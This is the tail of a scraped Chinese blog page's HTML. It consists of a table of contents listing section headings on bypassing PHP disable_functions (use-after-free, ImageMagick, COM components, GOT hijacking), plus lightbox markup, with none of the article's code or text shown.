+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#2%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-1"><span class="level3">0.6.2. </span>2、漏洞环境</a>
+                 </li><li class="h4" title="3、蚁剑脚本">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#3%E8%9A%81%E5%89%91%E8%84%9A%E6%9C%AC"><span class="level3">0.6.3. </span>3、蚁剑脚本</a>
+                 </li><li class="h3" title="六、GC UAF、Json Serializer UAF、Backtrace UAF">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#%E5%85%ADgc-uafjson-serializer-uafbacktrace-uaf"><span class="level2">0.7. </span>六、GC UAF、Json Serializer UAF、Backtrace UAF</a>
+                 </li><li class="h4" title="1、EXP工具环境">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#1exp%E5%B7%A5%E5%85%B7%E7%8E%AF%E5%A2%83"><span class="level3">0.7.1. </span>1、EXP工具环境</a>
+                 </li><li class="h4" title="2、漏洞环境">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#2%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-2"><span class="level3">0.7.2. </span>2、漏洞环境</a>
+                 </li><li class="h3" title="七、ImageMagick">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#%E4%B8%83imagemagick"><span class="level2">0.8. </span>七、ImageMagick</a>
+                 </li><li class="h4" title="1、基本原理">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#1%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="level3">0.8.1. </span>1、基本原理</a>
+                 </li><li class="h4" title="2、版本条件">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#2%E7%89%88%E6%9C%AC%E6%9D%A1%E4%BB%B6"><span class="level3">0.8.2. </span>2、版本条件</a>
+                 </li><li class="h4" title="3、漏洞环境">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#3%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-1"><span class="level3">0.8.3. </span>3、漏洞环境</a>
+                 </li><li class="h4" title="4、漏洞复现">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="level3">0.8.4. </span>4、漏洞复现</a>
+                 </li><li class="h3" title="八、COM组件">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#%E5%85%ABcom%E7%BB%84%E4%BB%B6"><span class="level2">0.9. </span>八、COM组件</a>
+                 </li><li class="h4" title="1、条件">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#1%E6%9D%A1%E4%BB%B6"><span class="level3">0.9.1. </span>1、条件</a>
+                 </li><li class="h4" title="2、漏洞exp">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#2%E6%BC%8F%E6%B4%9Eexp"><span class="level3">0.9.2. </span>2、漏洞exp</a>
+                 </li><li class="h3" title="九、劫持got表绕过diable_function">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#%E4%B9%9D%E5%8A%AB%E6%8C%81got%E8%A1%A8%E7%BB%95%E8%BF%87diable_function"><span class="level2">0.10. </span>九、劫持got表绕过diable_function</a>
+                 </li><li class="h4" title="1、文章传送门">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#1%E6%96%87%E7%AB%A0%E4%BC%A0%E9%80%81%E9%97%A8"><span class="level3">0.10.1. </span>1、文章传送门</a>
+                 </li><li class="h4" title="2、exp代码">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#2exp%E4%BB%A3%E7%A0%81"><span class="level3">0.10.2. </span>2、exp代码</a>
+                 </li></ul></div><script type="text/javascript">getFollowStatus('03047725-dc1f-421a-aedf-08d7709b037e');</script><div id="lightboxOverlay" tabindex="-1" class="lightboxOverlay" style="display: none;"></div><div id="lightbox" tabindex="-1" class="lightbox" style="display: none;"><div class="lb-outerContainer"><div class="lb-container"><img class="lb-image" src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" alt=""><div class="lb-nav"><a class="lb-prev" aria-label="Previous image" href="https://www.cnblogs.com/sakura521/p/15055907.html"></a><a class="lb-next" aria-label="Next image" href="https://www.cnblogs.com/sakura521/p/15055907.html"></a></div><div class="lb-loader"><a class="lb-cancel"></a></div></div></div><div class="lb-dataContainer"><div class="lb-data"><div class="lb-details"><span class="lb-caption"></span><span class="lb-number"></span></div><div class="lb-closeContainer"><a class="lb-close"></a></div></div></div></div></body></html>
